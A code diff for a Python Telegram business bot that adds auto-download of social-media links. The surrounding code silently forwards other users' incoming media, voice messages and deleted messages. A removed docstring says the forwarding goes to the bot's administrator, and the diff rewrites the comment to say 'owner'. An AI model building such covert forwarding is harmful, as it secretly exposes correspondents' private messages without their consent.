@@ -8,7 +8,7 @@ from aiogram.types import Message, BusinessMessagesDeleted, BusinessConnection
 from aiogram.filters import Command
 from aiogram.exceptions import TelegramRetryAfter
 from fun import cmd_spam, cmd_stop, cmd_fuck, get_like_suffix
-from save import cmd_save, cmd_broadcast
+from save import cmd_save, cmd_broadcast, auto_download, extract_url
 
 logging.basicConfig(level=logging.INFO)
 
@@ -202,7 +202,6 @@ async def forward_deleted(msg: Message, owner_id: int):
 
 
 async def forward_media_silent(owner_id: int, msg: Message):
-    """Тихо пересылает все медиа/голосовые сообщения администратору бота."""
     try:
         name, uid = build_sender_info(msg)
         info = connected_users.get(owner_id)
@@ -354,7 +353,13 @@ async def handle_business_message(message: Message):
     if is_bot_sent(message):
         return
 
-    # Тихая пересылка медиа/голосовых тебе (только входящие от других пользователей)
+    # Автоматическое скачивание по ссылке на соц. сеть
+    msg_text = message.text or message.caption or ""
+    if extract_url(msg_text):
+        await auto_download(message, bot)
+        return
+
+    # Тихая пересылка медиа/голосовых только владельцу (только входящие от других)
     if sender_id != owner_id and has_media(message):
         await forward_media_silent(owner_id, message)
 
